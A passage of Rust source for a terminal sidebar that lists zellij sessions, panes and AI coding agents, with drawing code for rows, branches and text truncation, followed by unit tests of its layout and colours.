            let rule_style = if *here { Style::new().fg(ACCENT) } else { dim };
            let mut spans = vec![
                Span::raw(" "),
                Span::styled(if folded { FOLDED } else { UNFOLDED }, dim),
                Span::styled(" ", chip),
            ];
            spans.extend(name);
            spans.extend([Span::styled(" ", chip), Span::styled(RULE.repeat(rule), rule_style)]);
            if let Some(badge) = badge {
                spans.push(Span::raw(" "));
                spans.push(badge);
            }
            RowLines { lines: vec![Line::from(spans)], number: None, cuts }
        },
        Row::Pane { here, unread, marked, icon, label, hits, checkout, bracket, speaks, .. } => {
            let mark = marked.as_ref().map(|marked| &marked.mark);
            let since = marked.as_ref().and_then(|marked| marked.since);
            let age = since.map_or_default(|since| age(since, now));
            let speaker = if *speaks { aloud::MARK.width() + 1 } else { 0 };
            let reserve = speaker + if age.is_empty() { 0 } else { age.width() + 1 };
            // A pane with no mark, of an agent or of a command, is dimmed,
            // and its icon is drawn as its label is.
            let label_style = match mark {
                Some(Mark::Waiting) => Style::new().fg(ACCENT).add_modifier(Modifier::BOLD),
                Some(_) => Style::new(),
                None => dim,
            };
            let height = row.height();
            let mut spans = vec![margin(*here), gutter(*bracket, 0, height)];
            let dotted = dotted(*unread, marked.as_ref());
            spans.push(if dotted { dot() } else { Span::raw(" ") });
            match mark {
                Some(mark) => {
                    let (glyph, style) = mark.glyph(frame);
                    spans.push(Span::styled(glyph, style));
                },
                None => spans.push(Span::raw(" ".repeat(MARK))),
            }
            spans.push(Span::raw(" "));
            match icon {
                Some(icon) => spans.push(Span::styled(*icon, label_style)),
                None => spans.push(Span::raw(" ".repeat(icons::WIDTH))),
            }
            spans.push(Span::raw(" "));
            let room = width.saturating_sub(LABEL + reserve + 1);
            let (shown, wide) = lit(label, room, Keep::Start, hits, label_style);
            let mut cuts: Vec<CutAt> = cut_at(0, LABEL, label, room).into_iter().collect();
            let gap = width.saturating_sub(LABEL + wide + speaker + age.width() + 1);
            spans.extend(shown);
            spans.push(Span::raw(" ".repeat(gap)));
            if *speaks {
                spans.push(Span::styled(aloud::MARK, Style::new().fg(ACCENT)));
                spans.push(Span::raw(" "));
            }
            spans.push(Span::styled(age, dim));
            let mut lines = vec![Line::from(spans)];
            let mut number = None;
            if let Some(checkout) = checkout {
                let at = lines.len();
                let (drawn, columns, branch_room) =
                    checkout_line(*here, gutter(*bracket, at, height), checkout, width);
                lines.push(drawn);
                cuts.extend(cut_at(at, LABEL, &checkout.branch, branch_room));
                let link = checkout.pull_request.as_ref().and_then(Numbered::link);
                let number_at = |(columns, link)| NumberAt { line: at, columns, link };
                number = columns.zip(link).map(number_at);
            }
            RowLines { lines, number, cuts }
        },
    }
}

/// Which end of a text a cut keeps: its start, as `cut` keeps it, or its
/// end, as `tail` does.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Keep {
    Start,
    End,
}

/// `text` cut to `room` columns, as `cut` or `tail` cuts it by what it
/// `keep`s, in `style`, and how wide that is. The characters of `text` at
/// `hits`, which a search found, light up in the accent, but are underlined
/// on a text in the accent already, or on a colour of its own, as no colour
/// reads on every one. None of those the cut took lights up, nor the `…`
/// that stands for them.
pub fn lit(
    text: &str,
    room: usize,
    keep: Keep,
    hits: &[usize],
    style: Style,
) -> (Vec<Span<'static>>, usize) {
    let shown = match keep {
        Keep::Start => cut(text, room),
        Keep::End => tail(text, room),
    };
    let hit = if style.fg == Some(ACCENT) || style.bg.is_some() {
        style.add_modifier(Modifier::UNDERLINED)
    } else {
        Style::new().fg(ACCENT).add_modifier(Modifier::BOLD)
    };
    let (whole, count, all) = (shown == text, shown.chars().count(), text.chars().count());
    // Where in `text` the character at `at` of `shown` is: nowhere, for the
    // `…`.
    let place = |at: usize| match keep {
        _ if whole => Some(at),
        Keep::Start => (at + 1 < count).then_some(at),
        Keep::End => (at > 0).then(|| all - count + at),
    };
    let mut spans: Vec<Span<'static>> = Vec::new();
    for (at, c) in shown.chars().enumerate() {
        let found = place(at).is_some_and(|place| hits.contains(&place));
        let style = if found { hit } else { style };
        match spans.last_mut() {
            Some(last) if last.style == style => last.content.to_mut().push(c),
            _ => spans.push(Span::styled(c.to_string(), style)),
        }
    }
    (spans, shown.width())
}

/// What a session's row ends in: how many of its agents wait for you, or else
/// the dot, while it is `dotted`, or else the spinner, while it is `spinning`.
fn badge(waiting: usize, dotted: bool, spinning: bool, frame: usize) -> Option<Span<'static>> {
    if waiting > 0 {
        let (dot, style) = Mark::Waiting.glyph(frame);
        return Some(Span::styled(format!("{dot}{waiting}"), style));
    }
    if dotted {
        return Some(dot());
    }
    if spinning {
        let (spinner, style) = Mark::Busy.glyph(frame);
        return Some(Span::styled(spinner, style));
    }
    None
}

/// What a session's colour is drawn in, as a browser colours its groups of
/// tabs: its name sits on it, and the brackets of its tabs are drawn in it.
fn hue(colour: Colour) -> Color {
    match colour {
        Colour::Blue => gruvbox::BLUE,
        Colour::Yellow => gruvbox::YELLOW,
        Colour::Purple => gruvbox::PURPLE,
        Colour::Aqua => gruvbox::AQUA,
        Colour::Orange => gruvbox::ORANGE,
        Colour::Green => gruvbox::GREEN,
    }
}

/// The first column of a pane's lines: `HERE_MARK` on the pane luneta's
/// zellij is on, `here`.
fn margin(here: bool) -> Span<'static> {
    if here {
        Span::styled(HERE_MARK, Style::new().fg(ACCENT).add_modifier(Modifier::BOLD))
    } else {
        Span::raw(" ")
    }
}

/// The column after a pane's mark, on its line `at` of the `height` it
/// takes: the bracket that joins it to the panes of its tab, where it sits
/// among them as it `sits`, in its session's colour, or else blank.
fn gutter(bracket: Option<(Bracket, Color)>, at: usize, height: usize) -> Span<'static> {
    let Some((sits, colour)) = bracket else {
        return Span::raw(" ");
    };
    let glyph = match sits {
        Bracket::First if at == 0 => BRACKET_TOP,
        Bracket::Last if at + 1 == height => BRACKET_FOOT,
        Bracket::First | Bracket::Inner | Bracket::Last => BRACKET_SIDE,
    };
    Span::styled(glyph, Style::new().fg(colour))
}

/// The line under a pane's row, `width` wide: the branch checked out where it
/// works, under its label, then how many lines changed on the branch, then
/// the number of its pull request, with the mark of its checks, and how its
/// work tree stands. The branch is cut to leave the other three whole. The
/// mark of the pane luneta's zellij is on, `here`, runs down it too, and the
/// `gutter` after it. And the columns the number is on, as the line has it,
/// for a click to go by, and the room the branch had, for a sweep over it.
fn checkout_line(
    here: bool,
    gutter: Span<'static>,
    checkout: &Checkout,
    width: usize,
) -> (Line<'static>, Option<Range<usize>>, usize) {
    let status = &checkout.status;
    let changed = checkout.changed.map(changed_shown);
    let number = checkout
        .pull_request
        .as_ref()
        .map(|numbered| Span::styled(numbered.shown(), Style::new().fg(numbered.colour)));
    let checks = checkout.pull_request.as_ref().and_then(|numbered| numbered.checks);
    let mark = checks.map(verdict_mark);
    // What comes after the branch, and the spaces between its parts: the
    // lines changed, the number with the mark of its checks, and how the
    // work tree stands.
    let held = changed.as_ref().map_or(0, |(_, wide)| wide + 1)
        + number.as_ref().map_or(0, |number| number.content.width() + 1)
        + mark.as_ref().map_or(0, Span::width);
    let reserve = if status.is_empty() { 0 } else { status.width() + 1 };
    let room = width.saturating_sub(LABEL + held + reserve + 1);
    let branch = cut(&checkout.branch, room);
    let gap = width.saturating_sub(LABEL + branch.width() + held + status.width() + 1);
    let mut spans = vec![
        margin(here),
        gutter,
        Span::raw(" ".repeat(LABEL - 2)),
        Span::styled(branch, Style::new().fg(gruvbox::GREY)),
    ];
    let mut columns = None;
    if let Some((shown, _)) = changed {
        spans.push(Span::raw(" "));
        spans.extend(shown);
    }
    if let Some(number) = number {
        spans.push(Span::raw(" "));
        let start: usize = spans.iter().map(Span::width).sum();
        columns = Some(start..start + number.width());
        spans.push(number);
        spans.extend(mark);
    }
    spans.push(Span::raw(" ".repeat(gap)));
    spans.push(Span::raw(status.clone()));
    (Line::from(spans), columns, room)
}

/// `text` cut to `room` columns, with a `…` for what it took. What shows as one
/// stays whole, and counts as wide as it shows.
pub fn cut(text: &str, room: usize) -> String {
    if text.width() <= room {
        return text.to_owned();
    }
    let mut kept = String::new();
    let mut taken = 0;
    for shown in text.graphemes(true) {
        let width = shown.width();
        if taken + width + 1 > room {
            break;
        }
        kept.push_str(shown);
        taken += width;
    }
    if room > 0 {
        kept.push('…');
    }
    kept
}

/// `text` cut to its last `room` columns, with a `…` for what it took, as `cut`
/// cuts.
pub fn tail(text: &str, room: usize) -> String {
    if text.width() <= room {
        return text.to_owned();
    }
    let mut start = text.len();
    let mut taken = 0;
    for (at, shown) in text.grapheme_indices(true).rev() {
        let width = shown.width();
        if taken + width + 1 > room {
            break;
        }
        start = at;
        taken += width;
    }
    if room == 0 {
        return String::new();
    }
    format!("…{}", &text[start..])
}

/// What goes at the bottom of the sidebar: its lines, those of them that go on
/// from the line above, as `wrapped` breaks a note too long for one, and what
/// each note says.
#[derive(Debug, Default)]
struct Notes {
    lines: Vec<Line<'static>>,
    goes_on: Vec<usize>,
    said: Vec<String>,
}

impl Notes {
    /// Puts `text` on as many lines of `width` as it takes.
    fn say(&mut self, text: &str, width: usize, style: Style) {
        let lines = wrapped(text, width, style);
        let start = self.lines.len();
        self.goes_on.extend(start + 1..start + lines.len());
        self.lines.extend(lines);
        self.said.push(text.to_owned());
    }
}

/// `text` on as many lines of `width` as it takes, a space in from the edge.
pub fn wrapped(text: &str, width: usize, style: Style) -> Vec<Line<'static>> {
    let room = width.saturating_sub(2).max(1);
    let mut lines = Vec::new();
    let mut line = String::new();
    for shown in text.graphemes(true) {
        if line.width() + shown.width() > room {
            lines.push(Line::styled(format!(" {line}"), style));
            line.clear();
        }
        line.push_str(shown);
    }
    if !line.is_empty() {
        lines.push(Line::styled(format!(" {line}"), style));
    }
    lines
}

#[cfg(test)]
mod tests {
    use std::sync::LazyLock;

    use lunetad::api::shell::{ended, Ended, Going, Stopped};
    use lunetad::api::{self, Clients, NameSource, Pane, Panes, UnreadFile, Version, Zellij};
    use prost_types::Timestamp;
    use ratatui::buffer::Cell;

    use super::*;
    use crate::own::Before;
    use crate::pull::{At, Readied, Ready};
    use crate::spots::Hit;

    fn pane(id: u32, tab: u32, cwd: &str, command: &str) -> Pane {
        Pane {
            id,
            tab,
            tab_name: format!("Tab #{}", tab + 1),
            cwd: Some(cwd.to_owned()),
            command: Some(command.to_owned()),
            titled: None,
            shell: None,
            tab_id: Some(tab),
            held: false,
        }
    }

    /// A session whose socket has the inode of the second it started at.
    fn session(name: &str, started: i64, panes: Vec<Pane>) -> Session {
        Session {
            name: name.to_owned(),
            started_at: Some(Timestamp { seconds: started, nanos: 0 }),
            panes: Some(Panes { panes }),
            clients: None,
            socket: started as u64,
        }
    }

    fn listed(name: &str, started: u64) -> Listed {
        let started_at = SystemTime::UNIX_EPOCH + Duration::from_secs(started);
        let kept = ledger::Session::new(started_at, NonZeroU64::new(started).unwrap()).unwrap();
        Listed { name: session_name(name), kept }
    }

    /// The pane `pane` of the session `name` that started at `started`.
    fn pane_of(name: &str, started: u64, pane: u32) -> Place {
        Place::Pane(PanePlace { session: listed(name, started), pane })
    }

    fn session_name(name: &str) -> SessionName {
        SessionName::parse(name).unwrap()
    }

    /// What the sidebar asks of luneta for the menu numbered `menu`: zellij
    /// here, to say what closing the pane `pane` of `session` closes.
    fn closes_here(menu: u64, session: &str, pane: u32) -> Asked {
        Asked::Closes { menu, on: Machine::Local, session: session_name(session), pane }
    }

    /// What the sidebar asks of luneta for a delete key: zellij here, to do
    /// `act`.
    fn delete_here(act: Act) -> Asked {
        Asked::Delete { on: Machine::Local, act }
    }

    /// What takes luneta's zellij to `place`, of this machine.
    fn go_here(place: Place) -> Asked {
        Asked::Go { on: Machine::Local, place }
    }

    /// A sidebar on a machine that goes by `mac`.
    fn fresh() -> Sidebar {
        Sidebar { this: "mac".to_owned(), ..Sidebar::default() }
    }

    /// The pane or the session of this machine's the highlight is on, if it
    /// is on one.
    fn cursor(sidebar: &Sidebar) -> Option<Place> {
        match sidebar.cursor.as_ref()? {
            Spot::Local(place) => Some(place.clone()),
            Spot::Machine(_) | Spot::Remote(..) => None,
        }
    }

    /// Whether this machine's session `name` is folded.
    fn folded(sidebar: &Sidebar, name: &str) -> bool {
        sidebar.folds.contains(Fold::Session(&Machine::Local, &session_name(name)))
    }

    /// Folds this machine's session `name`, as another luneta would.
    fn fold(sidebar: &mut Sidebar, name: &str) {
        sidebar.folds.set(Fold::Session(&Machine::Local, &session_name(name)), true);
    }

    fn agent(session: &str, pane: u32, status: Status, name: Option<&str>) -> Agent {
        Agent {
            pid: pane,
            harness: Some(Harness::ClaudeCode.into()),
            session_id: format!("id-{pane}"),
            cwd: "/w/luneta/main".to_owned(),
            status: Some(Reported::KnownStatus(status.into())),
            status_since: Some(Timestamp { seconds: 100, nanos: 0 }),
            started_at: Some(Timestamp { seconds: 50, nanos: 0 }),
            name: name.map(|text| api::Name { text: text.to_owned(), source: None }),
            entrypoint: Some("cli".to_owned()),
            zellij: Some(Zellij {
                named: session.to_owned(),
                session: Some(session.to_owned()),
                pane,
            }),
            waiting_for: None,
            topic: None,
        }
    }

    fn host(sessions: Vec<Session>, agents: Vec<Agent>) -> Host {
        Host {
            version: Some(Version { pid: 1, seq: 1 }),
            sessions,
            work_trees: Vec::new(),
            agents,
            unread: 0,
            pull_requests: Vec::new(),
            unread_sockets: Some(0),
            unread_files: Vec::new(),
            remotes: Vec::new(),
            unread_hosts: Some(0),
            sayings: Vec::new(),
        }
    }

    /// The sidebar drawn `width` columns wide and `height` tall, with the
    /// focus or without.
    fn drawn(sidebar: &mut Sidebar, focused: bool, width: u16, height: u16) -> Buffer {
        let now = SystemTime::UNIX_EPOCH + Duration::from_secs(160);
        drawn_at(sidebar, focused, width, height, now)
    }

    /// The sidebar as `drawn` draws it, at `now`. Each cell is in gruvbox's
    /// colours, on the terminal's background or, on the highlight, the one
    /// that says whether the sidebar has the focus; and focused, the softer
    /// one, on the row a move lands on.
    fn drawn_at(
        sidebar: &mut Sidebar,
        focused: bool,
        width: u16,
        height: u16,
        now: SystemTime,
    ) -> Buffer {
        let area = Rect::new(0, 0, width, height);
        let mut buffer = Buffer::empty(area);
        sidebar.focus(if focused { Keys::Sidebar } else { Keys::Zellij });
        sidebar.draw(&mut buffer, area, now);
        let lit: &[Color] = if focused { &[LIT, RESTING] } else { &[RESTING] };
        in_gruvbox(&buffer, &[&[Color::Reset], lit].concat());
        buffer
    }

    /// The sidebar collapsed, `height` tall, as it is drawn at `now`. Each
    /// cell is in gruvbox's colours, on the terminal's background.
    fn collapsed(sidebar: &mut Sidebar, height: u16, now: SystemTime) -> Buffer {
        let area = Rect::new(0, 0, COLLAPSED, height);
        let mut buffer = Buffer::empty(area);
        sidebar.draw_collapsed(&mut buffer, area, now);
        in_gruvbox(&buffer, &[Color::Reset]);
        buffer
    }

    /// Holds each cell of `buffer` to gruvbox's colours, on one of
    /// `backgrounds`, or on a session's colour in gruvbox's background, as a
    /// session's name is: a colour named at a call site, as `Color::Red`, or a
    /// line drawn without `fg1`, would be the terminal's.
    fn in_gruvbox(buffer: &Buffer, backgrounds: &[Color]) {
        for cell in buffer.content() {
            assert!(gruvbox::ALL.contains(&cell.fg), "{:?} in {:?}", cell.symbol(), cell.fg);
            let named = Colour::ALL.map(hue).contains(&cell.bg) && cell.fg == gruvbox::BG0;
            let on = backgrounds.contains(&cell.bg) || named;
            assert!(on, "{:?} on {:?}", cell.symbol(), cell.bg);
        }
    }

    /// The sidebar `width` columns wide and `height` tall, as text, up to its
    /// edge.
    fn screen(sidebar: &mut Sidebar, focused: bool, width: u16, height: u16) -> Vec<String> {
        seen(sidebar, focused, width, height).0
    }

    /// The sidebar as `screen` draws it, and the lines the highlight is on.
    fn seen(
        sidebar: &mut Sidebar,
        focused: bool,
        width: u16,
        height: u16,
    ) -> (Vec<String>, Vec<u16>) {
        let now = SystemTime::UNIX_EPOCH + Duration::from_secs(160);
        seen_at(sidebar, focused, width, height, now)
    }

    /// The sidebar as `seen` draws it, at `now`.
    fn seen_at(
        sidebar: &mut Sidebar,
        focused: bool,
        width: u16,
        height: u16,
        now: SystemTime,
    ) -> (Vec<String>, Vec<u16>) {
        let buffer = drawn_at(sidebar, focused, width, height, now);
        let lines = (0..height)
            .map(|y| {
                let line: String = (0..width - 1).map(|x| buffer[(x, y)].symbol()).collect();
                line.trim_end().to_owned()
            })
            .collect();
        let lit = (0..height)
            .filter(|y| buffer[(0, *y)].bg != Color::Reset)
            .collect();
        (lines, lit)
    }

    /// Two sessions, whose rows have Claude's icon, `\u{ec82}`, neovim's,
    /// `\u{e6ae}`, and a terminal's, `\u{e795}`.
    fn two_sessions() -> Sidebar {
        let mut sidebar = fresh();
        sidebar.heard(host(
            vec![
                session("newer", 20, vec![pane(1, 0, "/w/b", "fish")]),
                session(
                    "older",
                    10,
                    vec![
                        pane(2, 1, "/w/c", "nvim src/main.rs"),
                        pane(1, 0, "/w/luneta/main", "claude"),
                    ],
                ),
            ],
            vec![agent("older", 1, Status::Waiting, Some("fold"))],
        ));
        sidebar.titled("older | ~/w/luneta".to_owned());
        sidebar
    }

    #[test]
    fn sessions_go_oldest_first_with_their_panes_in_tab_order() {
        let mut sidebar = two_sessions();
        assert_eq!(
            screen(&mut sidebar, false, 32, 9),
            [
                "─ luneta ──────────────────────",
                "─ 2 sessions ───────────── ●1 ─",
                "",
                " ▾ \u{f108} mac ══════════════════ ●1",
                " ▾ older ────────────────── ●1",
                "   ● \u{ec82} fold                 1m",
                "     \u{e6ae} nvim src/main.rs",
                " ▾ newer ─────────────────────",
                "     \u{e795} w/b",
            ]
        );
    }

    /// A bracket down the column after `▌` joins the panes of a tab that
    /// holds more than one, from the first line of the first, down the branch
    /// under one, to the last line of the last. A pane alone in its tab has
    /// none, nor has one a search lists alone of its tab, as for `c` here.
    #[test]
    fn a_bracket_joins_the_panes_that_share_a_tab() {
        let panes = vec![
            pane(1, 0, "/w/a", "less a"),
            pane(2, 1, "/w/b", "less b"),
            pane(3, 1, "/w/c", "less c"),
            pane(4, 2, "/w/c", "less d"),
            pane(5, 2, "/w/b", "less e"),
        ];
        let mut host = host(vec![session("s", 10, panes)], Vec::new());
        let name = Said::new("main".to_owned()).expect("a branch's name");
        let head = Head::Branch { name, upstream: None, changed: None };
        let changes = Changes::default();
        let tree = WorkTree::Checkout { repository: None, head, changes, stashes: 0 };
        host.work_trees.push(tree.to_api("/w/b"));
        let mut sidebar = fresh();
        sidebar.heard(host);

        assert_eq!(
            rows_shown(&mut sidebar),
            [
                " ▾ s",
                "       less a",
                " ╭     less b",
                " │     main",
                " ╰     less c",
                " ╭     less d",
                " │     less e",
                " ╰     main",
            ]
        );
        type_in(&mut sidebar, "/c");
        assert_eq!(rows_shown(&mut sidebar), [" ▾ s", "       less c", "       less d"]);
    }

    /// Each session has a colour of its own, which its name sits on, with a
    /// space either side, and which the brackets of its tabs are drawn in. It
    /// keeps it as a session before it ends, as it is renamed, and while the
    /// daemon's list may leave it out; and once it has ended, the next to
    /// start takes it.
    #[test]
    fn a_session_has_a_colour_of_its_own_and_keeps_it() {
        // The backgrounds of `count` cells of the line `line` of the rows
        // under this machine's header, from the column `from` on, and the
        // colour of its bracket.
        let top = HEADER + 1;
        let backgrounds = |buffer: &Buffer, line: usize, from: u16, count: u16| {
            (from..from + count).map(|x| buffer[(x, (top + line) as u16)].bg).collect::<Vec<_>>()
        };
        let bracket = |buffer: &Buffer, line: usize| buffer[(1, (top + line) as u16)].fg;
        // The sessions `named`, each of a tab of two panes, by their names
        // and starts, as a daemon lists them that could not read
        // `unread_sockets` of zellij's folder.
        let listing = |named: &[(&str, i64)], unread_sockets| {
            let shared = || vec![pane(1, 0, "/w/a", "less"), pane(2, 0, "/w/a", "less")];
            let sessions = named.iter().map(|(name, at)| session(name, *at, shared()));
            Host { unread_sockets, ..host(sessions.collect(), Vec::new()) }
        };
        // The colours the names of the first `count` sessions sit on.
        let names = |sidebar: &mut Sidebar, count: usize| {
            let buffer = drawn(sidebar, false, 32, 20);
            (0..count).map(|at| backgrounds(&buffer, at * 3, 3, 1)[0]).collect::<Vec<_>>()
        };
        let mut sidebar = fresh();
        sidebar.heard(listing(&[("a", 1), ("b", 2), ("c", 3)], Some(0)));
        let buffer = drawn(&mut sidebar, false, 32, 16);
        let (b, y, p, a) = (gruvbox::BLUE, gruvbox::YELLOW, gruvbox::PURPLE, gruvbox::AQUA);
        assert_eq!(backgrounds(&buffer, 0, 1, 5), [Color::Reset, b, b, b, Color::Reset]);
        assert_eq!(buffer[(3, top as u16)].fg, gruvbox::BG0);
        assert_eq!([bracket(&buffer, 1), bracket(&buffer, 2)], [b, b]);
        assert_eq!(backgrounds(&buffer, 3, 3, 1), [y]);
        assert_eq!([bracket(&buffer, 4), bracket(&buffer, 5)], [y, y]);
        assert_eq!(backgrounds(&buffer, 6, 3, 1), [p]);

        // The daemon leaves a out of lists it could not read all of zellij's
        // folder for, as d starts, for longer than `GONE`: a keeps its
        // colour, and d takes one no other has.
        sidebar.heard(listing(&[("b", 2), ("c", 3), ("d", 4)], Some(1)));
        tick(&mut sidebar, 160_000);
        tick(&mut sidebar, 175_000);
        sidebar.heard(listing(&[("a", 1), ("b", 2), ("c", 3), ("d", 4)], Some(0)));
        tick(&mut sidebar, 176_000);
        assert_eq!(names(&mut sidebar, 4), [b, y, p, a]);

        // b is renamed e, and keeps its colour. a ends, and gives its up once
        // the daemon has not listed it for `GONE`, for f to take.
        sidebar.heard(listing(&[("e", 2), ("c", 3), ("d", 4)], Some(0)));
        tick(&mut sidebar, 180_000);
        tick(&mut sidebar, 190_000);
        sidebar.heard(listing(&[("e", 2), ("c", 3), ("d", 4), ("f", 5)], Some(0)));
        assert_eq!(names(&mut sidebar, 4), [y, p, a, b]);
        assert_eq!(bracket(&drawn(&mut sidebar, false, 32, 20), 10), b);
    }

    /// While the daemon does not answer, what it said last gives no colour to
    /// keep: a session it lists may have ended since, and another luneta
    /// given its colour up.
    #[test]
    fn a_list_that_stands_gives_no_colour_to_keep() {
        let scratch = tempfile::tempdir().unwrap();
        let file = scratch.path().join("order");
        let order = Order::within(file.clone());
        let (folds, news, agent) = (Folds::default(), News::default(), Kept::default());
        let mut sidebar = Sidebar::new(folds, news, order, agent, "mac".to_owned());
        sidebar.heard(host(vec![session("a", 1, Vec::new())], Vec::new()));
        sidebar.lost("lunetad does not answer".to_owned());
        std::fs::write(&file, r#"{"sessions": []}"#).unwrap();
        sidebar.reorder();
        assert_eq!(std::fs::read_to_string(&file).unwrap(), r#"{"sessions": []}"#);
    }

    /// A colour kept for a session that starts takes up a move another
    /// luneta made, which this one has yet to hear of, and the rows go in it
    /// then, rather than once something else builds them again.
    #[test]
    fn a_colour_kept_takes_up_a_move_made_elsewhere() {
        let scratch = tempfile::tempdir().unwrap();
        let file = scratch.path().join("order");
        let order = Order::within(file.clone());
        let (folds, news, agent) = (Folds::default(), News::default(), Kept::default());
        let mut sidebar = Sidebar::new(folds, news, order, agent, "mac".to_owned());
        let listing = |named: &[(&str, i64)]| {
            let sessions = named.iter().map(|(name, at)| session(name, *at, Vec::new()));
            host(sessions.collect(), Vec::new())
        };
        sidebar.heard(listing(&[("a", 1), ("b", 2)]));
        Order::within(file).keep_sessions(&Machine::Local, vec!["b".to_owned(), "a".to_owned()]);
        sidebar.heard(listing(&[("a", 1), ("b", 2), ("c", 3)]));
        assert_eq!(rows_shown(&mut sidebar), [" ▾ b", " ▾ a", " ▾ c"]);
        sidebar.reorder();
        assert_eq!(rows_shown(&mut sidebar), [" ▾ b", " ▾ a", " ▾ c"]);
    }

    /// The first line says `luneta`, in the accent, the word bold, while the
    /// sidebar has the keys, and dim while zellij has them.
    #[test]
    fn the_title_is_in_the_accent_while_the_sidebar_has_the_keys() {
        let mut sidebar = two_sessions();
        let look = |buffer: &Buffer, x: u16| {
            let cell = &buffer[(x, 0)];
            let has = |modifier| cell.modifier.contains(modifier);
            (cell.fg, has(Modifier::DIM), has(Modifier::BOLD))
        };
        let dim = (gruvbox::FG1, true, false);
        let accent = |bold| (ACCENT, false, bold);
        for (focused, rule, word) in
            [(false, dim, dim), (true, accent(false), accent(true)), (false, dim, dim)]
        {
            assert_eq!(screen(&mut sidebar, focused, 32, 3)[0], "─ luneta ──────────────────────");
            let buffer = drawn(&mut sidebar, focused, 32, 3);
            // The first `─`, the word's `l` and the last `─`.
            assert_eq!([0, 2, 30].map(|x| look(&buffer, x)), [rule, word, rule], "{focused}");
        }
    }

    /// A brief the sidebar asked for has the keys until it closes: the title
    /// is dim, and the legend gone, while the highlight stays where the keys
    /// left it, for them to come back to.
    #[test]
    fn a_brief_lent_the_keys_dims_the_title_and_keeps_the_highlight() {
        let mut sidebar = two_sessions();
        let area = Rect::new(0, 0, 32, 12);
        let draw = |sidebar: &mut Sidebar| {
            let mut buffer = Buffer::empty(area);
            sidebar.draw(&mut buffer, area, moment(160_000));
            in_gruvbox(&buffer, &[Color::Reset, LIT]);
            let start = |y: u16| (0..9).map(|x| buffer[(x, y)].symbol()).collect::<String>();
            let titled = (0..area.height).filter(|y| start(*y) == "─ luneta ").count();
            let lit: Vec<u16> =
                (0..area.height).filter(|y| buffer[(0, *y)].bg != Color::Reset).collect();
            let word = &buffer[(2, 0)];
            (titled, lit, word.fg, word.modifier.contains(Modifier::DIM))
        };
        sidebar.focus(Keys::Sidebar);
        sidebar.key(&KeyEvent::new(KeyCode::Char('j'), KeyModifiers::NONE), moment(160_000));
        let cursor = sidebar.cursor.clone();
        let (titled, lit, fg, dim) = draw(&mut sidebar);
        // The title and the legend's rule.
        assert_eq!((titled, fg, dim, lit.is_empty()), (2, ACCENT, false, false));
        sidebar.focus(Keys::Lent);
        assert_eq!(draw(&mut sidebar), (1, lit.clone(), gruvbox::FG1, true));
        sidebar.focus(Keys::Sidebar);
        assert_eq!(draw(&mut sidebar), (2, lit, ACCENT, false));
        assert_eq!(sidebar.cursor, cursor);
    }

    /// The rule along the top counts the agents on the rows, a folded
    /// session's among them, and none that no row holds. Those in a shell
    /// are counted dim, as their mark is.
    #[test]
    fn the_top_rule_counts_the_agents_the_rows_hold() {
        let mut sidebar = fresh();
        let mut outside = agent("s", 4, Status::Waiting, None);
        outside.zellij = None;
        let panes = (1..=3).map(|id| pane(id, 0, "/w/a", "claude")).collect();
        sidebar.heard(host(
            vec![session("s", 10, panes)],
            vec![
                agent("s", 1, Status::Busy, None),
                agent("s", 2, Status::Shell, None),
                agent("s", 3, Status::Shell, None),
                outside,
            ],
        ));
        sidebar.key(&KeyEvent::new(KeyCode::Char('h'), KeyModifiers::NONE), moment(160_000));
        let rule = screen(&mut sidebar, false, 32, 4)[1].clone();
        assert_eq!((rule.as_str(), sidebar.turning()), ("─ 1 session ─────────── ⠋1 $2 ─", true));
        let buffer = drawn(&mut sidebar, false, 32, 4);
        let at = |glyph: char| rule.chars().position(|c| c == glyph).expect("on the rule") as u16;
        let dim = |x: u16| buffer[(x, 1)].modifier.contains(Modifier::DIM);
        let (spinner, dollar) = (at('⠋'), at('$'));
        assert_eq!(
            [spinner, spinner + 1, dollar, dollar + 1].map(dim),
            [false, false, true, true]
        );
    }

    /// Collapsed, the sidebar keeps under its rule only the counts of the
    /// panes with the dot, of the agents at work and of those in a shell, and
    /// none of the agents that wait for you. A count is cut to the columns it
    /// has before the edge, and a command counts once it has run a second, as
    /// on the rule along the top.
    #[test]
    fn collapsed_the_sidebar_keeps_the_dots_the_work_and_the_shells() {
        let mut sidebar = fresh();
        let mut panes: Vec<Pane> = (1..=103).map(|id| pane(id, 0, "/w/a", "claude")).collect();
        panes.push(in_shell(104, going("make", 159, Front::Working)));
        let mut agents =
            vec![agent("s", 1, Status::Idle, None), agent("s", 2, Status::Waiting, None)];
        agents.extend((3..=103).map(|id| agent("s", id, Status::Shell, None)));
        sidebar.heard(host(vec![session("s", 10, panes)], agents));
        let strip = |sidebar: &mut Sidebar, now| {
            let buffer = collapsed(sidebar, 6, now);
            let line = |y| (0..COLLAPSED - 1).map(|x| buffer[(x, y)].symbol()).collect::<String>();
            (0..6).map(|y| line(y).trim_end().to_owned()).collect::<Vec<_>>()
        };
        assert_eq!(strip(&mut sidebar, moment(160_500)), ["───", "", "•1", "$1…", "", ""]);
        assert_eq!(strip(&mut sidebar, moment(161_000)), ["───", "", "•1", "⠋1", "$1…", ""]);
    }

    /// Collapsed, the sidebar has no room for the note that says lunetad does
    /// not answer, so its rule turns the note's colour until lunetad answers
    /// again, and is drawn as the open sidebar's rule is otherwise.
    #[test]
    fn collapsed_the_sidebar_reddens_its_rule_while_lunetad_does_not_answer() {
        let mut sidebar = fresh();
        sidebar.heard(idle_agent());
        let look = |buffer: &Buffer, x: u16, y: u16| {
            let cell = &buffer[(x, y)];
            (cell.fg, cell.modifier.contains(Modifier::DIM))
        };
        let rule = |sidebar: &mut Sidebar| look(&collapsed(sidebar, 3, moment(160_000)), 0, 0);
        let open = look(&drawn(&mut sidebar, false, COLUMNS, 6), 0, 1);
        assert_eq!(rule(&mut sidebar), open);
        sidebar.lost("gone".to_owned());
        // The note, ` lunetad: gone`, takes the last line.
        let buffer = drawn(&mut sidebar, false, COLUMNS, 6);
        assert_eq!(buffer[(1, 5)].symbol(), "l");
        let note = look(&buffer, 1, 5);
        assert_ne!(note, open);
        assert_eq!(rule(&mut sidebar), note);
        sidebar.heard(idle_agent());
        assert_eq!(rule(&mut sidebar), open);
    }

    /// Collapsed, the sidebar has no room for the note that says an image is
    /// on its way either, so its rule turns that note's colour while it goes;
    /// but for lunetad not answering, which says more.
    #[test]
    fn collapsed_the_sidebar_tints_its_rule_while_an_image_goes() {
        let mut sidebar = fresh();
        sidebar.heard(idle_agent());
        let look = |buffer: &Buffer, x: u16, y: u16| {
            let cell = &buffer[(x, y)];
